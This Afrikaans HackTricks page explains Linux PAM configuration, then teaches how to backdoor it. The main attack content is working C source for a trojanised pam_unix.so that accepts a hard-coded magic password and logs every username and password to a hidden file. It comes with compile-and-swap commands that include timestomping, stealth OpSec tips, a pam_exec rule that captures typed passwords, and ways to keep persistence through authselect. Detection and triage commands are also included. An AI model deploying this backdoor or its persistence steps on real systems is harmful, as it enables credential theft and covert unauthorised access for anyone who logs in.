# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Basiese Inligting

**PAM (Pluggable Authentication Modules)** dien as 'n sekuriteitsmeganisme wat **die identiteit van gebruikers wat toegang tot rekenaardienste probeer verkry, verifieer**, en hul toegang op grond van verskeie kriteria beheer. Dit is soortgelyk aan 'n digitale hekwagter wat verseker dat slegs gemagtigde gebruikers met spesifieke dienste kan werk, terwyl hul gebruik moontlik beperk word om stelseloorlading te voorkom.

#### Konfigurasielêers

- **Solaris- en UNIX-gebaseerde stelsels** gebruik tipies 'n sentrale konfigurasielêer wat by `/etc/pam.conf` geleë is.
- **Linux-stelsels** verkies 'n gidsbenadering en stoor diensspesifieke konfigurasies binne `/etc/pam.d`. Die konfigurasielêer vir die login-diens kan byvoorbeeld gevind word by `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

'n Voorbeeld van 'n PAM-konfigurasie vir die login-diens kan soos volg lyk:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM-bestuursdomeine**

Hierdie domeine, of bestuursgroepe, sluit **auth**, **account**, **password**, en **session** in, wat elk verantwoordelik is vir verskillende aspekte van die authentication- en session-bestuursproses:<sup>[[1]](#references)</sup>

- **Auth**: Valideer die gebruiker se identiteit, dikwels deur vir ’n password te vra.
- **Account**: Hanteer account-verifikasie en kontroleer voorwaardes soos groep-lidmaatskap of tyd-van-die-dag-beperkings.
- **Password**: Bestuur password-opdaterings, insluitend kompleksiteitskontroles of voorkoming van dictionary attacks.
- **Session**: Bestuur aksies tydens die begin of einde van ’n diens-session, soos die mounting van directories of die instel van resource limits.

#### **PAM-modulekontroles**

Kontroles bepaal die module se reaksie op sukses of mislukking en beïnvloed die algehele authentication-proses. Dit sluit in:<sup>[[1]](#references)</sup>

- **Required**: Mislukking van ’n required-module lei uiteindelik tot mislukking, maar eers nadat alle daaropvolgende modules nagegaan is.
- **Requisite**: Onmiddellike beëindiging van die proses wanneer dit misluk.
- **Sufficient**: Sukses slaan die res van dieselfde domein se kontroles oor, tensy ’n daaropvolgende module misluk.
- **Optional**: Veroorsaak slegs mislukking indien dit die enigste module in die stack is.

#### Aanvalsemantiek wat saak maak

Wanneer PAM gebackdoor word, is die **ligging van die ingevoegde reël** dikwels belangriker as die payload self:

- `include` en `substack` trek reëls uit ander lêers, dus kan die wysiging van `sshd` slegs SSH beïnvloed, terwyl die wysiging van `system-auth`, `common-auth`, of ’n ander gedeelde stack verskeie dienste tegelyk kan beïnvloed.
- PAM ondersteun ook bracketed controls soos `[success=1 default=ignore]`. Dit kan misbruik word om **een of meer modules oor te slaan** ná ’n suksesvolle custom check, in plaas daarvan om `pam_unix.so` sigbaar te vervang.
- Die `module-path` kan **absolute** (`/usr/lib/security/pam_custom.so`) of **relative** tot die default PAM-module-directory wees. Op moderne Linux-stelsels is die werklike directories dikwels `/lib/security`, `/lib64/security`, `/usr/lib/security`, of multiarch-paaie soos `/usr/lib/x86_64-linux-gnu/security`.

Vinnige operateur-opsomming: karteer altyd die **volledige diens-grafiek** voordat jy patch. Byvoorbeeld, `sshd -> password-auth -> system-auth` op sommige distros, of `sshd -> system-remote-login -> system-login -> system-auth` op ander, beteken dat dieselfde een-reël-implantaat baie wyer as bedoel kan versprei.

#### Voorbeeldscenario

In ’n setup met veelvuldige auth-modules volg die proses ’n streng volgorde. As die `pam_securetty`-module die login-terminal as ongemagtig beskou, word root-logins geblokkeer, maar alle modules word steeds verwerk weens sy "required"-status. Die `pam_env` stel environment variables in, wat moontlik die user experience kan verbeter. Die `pam_ldap`- en `pam_unix`-modules werk saam om die gebruiker te authenticateer, met `pam_unix` wat probeer om ’n voorheen verskafde password te gebruik, wat doeltreffendheid en buigsaamheid in authentication-metodes verbeter.


## Backdooring PAM – Hooking `pam_unix.so`

’n Klassieke persistence-truuk in waardevolle Linux-omgewings is om die legitieme PAM-library met ’n trojanised drop-in te **vervang**. Omdat elke SSH- / console-login uiteindelik `pam_unix.so:pam_sm_authenticate()` aanroep, is ’n paar reëls C genoeg om credentials vas te lê of ’n *magic* password-bypass te implementeer.<sup>[[2]](#references)</sup>

### Compilation Cheatsheet
<details>
<summary>Voorbeeld van ’n `pam_unix.so`-trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
</details>

Kompileer en vervang onopvallend:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### OpSec-wenke
1. **Atomiese oorskryf** – skryf na ’n tydelike lêer en gebruik `mv` om dit in plek te plaas, om halfgeskrewe libraries te voorkom wat SSH kan uitsluit.
2. Loglêerplasing soos `/usr/bin/.dbus.log` meng met legitieme desktop-artefakte.
3. Hou symbol exports identies (`pam_sm_setcred`, ens.) om PAM-wanfunksionering te voorkom.

### Opsporing
* Vergelyk die MD5/SHA256 van `pam_unix.so` met dié van die distro-pakket.
* `rpm -V pam` of `debsums -s libpam-modules` om vervangde libraries raak te sien sonder handmatige hashing.
* Kontroleer vir wêreldskryfbare lêers of ongewone eienaarskap onder `/lib/security/`.
* `auditd`-reël: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Gebruik Grep op PAM-konfigurasies vir onverwagte modules: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Vinnige triage-opdragte (ná compromise of tydens threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Misbruik van `pam_exec` vir persistence
In plaas daarvan om `pam_unix.so` te vervang, is ’n minder ingrypende benadering om ’n `pam_exec`-reël by `/etc/pam.d/sshd` te voeg sodat elke SSH-login ’n implant uitvoer terwyl die normale stack ongeskonde bly:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` ontvang PAM-metadata in omgewingsveranderlikes soos `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` en `PAM_TYPE`. Met `expose_authtok` kan die helper ook die wagwoord vanaf `stdin` lees tydens `auth`- of `password`-fases. As jy wil hê die helper moet met die effektiewe UID eerder as die werklike UID loop, voeg `seteuid` by.

Praktiese notas:

- `session optional pam_exec.so ...` is beter vir **post-login actions** soos om sockets te heropen of ’n losstaande daemon te spawn.
- `auth optional pam_exec.so quiet expose_authtok ...` is die gewone keuse vir **credential capture**, omdat dit loop voordat die session oopmaak.
- `type=session` of `type=auth` kan gebruik word om uitvoering tot ’n spesifieke PAM-fase te beperk en raserige dubbele uitvoering te vermy.

### Surviving distro tooling: `authselect`

Op RHEL, CentOS Stream, Fedora en afgeleide systems kan direkte wysigings aan gegenereerde lêers soos `/etc/pam.d/system-auth` of `/etc/pam.d/password-auth` deur **`authselect` oorskryf word**. Vir volharding pas operators dikwels die aktiewe custom profile onder `/etc/authselect/custom/<profile>/` aan en kies of pas dit dan weer toe.

Tipiese workflow wanneer jy root het:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Dit is belangrik vir beide aanvalle en triage: as `/etc/pam.d/system-auth` die banner `Generated by authselect` en `Do not modify this file manually` bevat, kan die werklike persistence-punt onder `/etc/authselect/custom/` eerder as in `/etc/pam.d/` wees.

### Recent tradecraft wat in die praktyk waargeneem is

Onlangse verslaggewing uit 2025 oor die **Plague** Linux backdoor het dieselfde kernidee verder gevoer: ’n kwaadwillige PAM-komponent met ’n **static bypass password**, plus die opruiming van SSH-verwante omgewingsveranderlikes en shell history (`HISTFILE=/dev/null`) om sessiespore ná login te beperk.<sup>[[3]](#references)</sup> Dit is ’n nuttige hunting-patroon omdat die backdoor-logika in PAM kan wees, terwyl die stealth artifacts eers **ná** suksesvolle authentication verskyn.


## Verwysings

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [The Covert Operator's Playbook: Infiltration of Global Telecom Networks - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
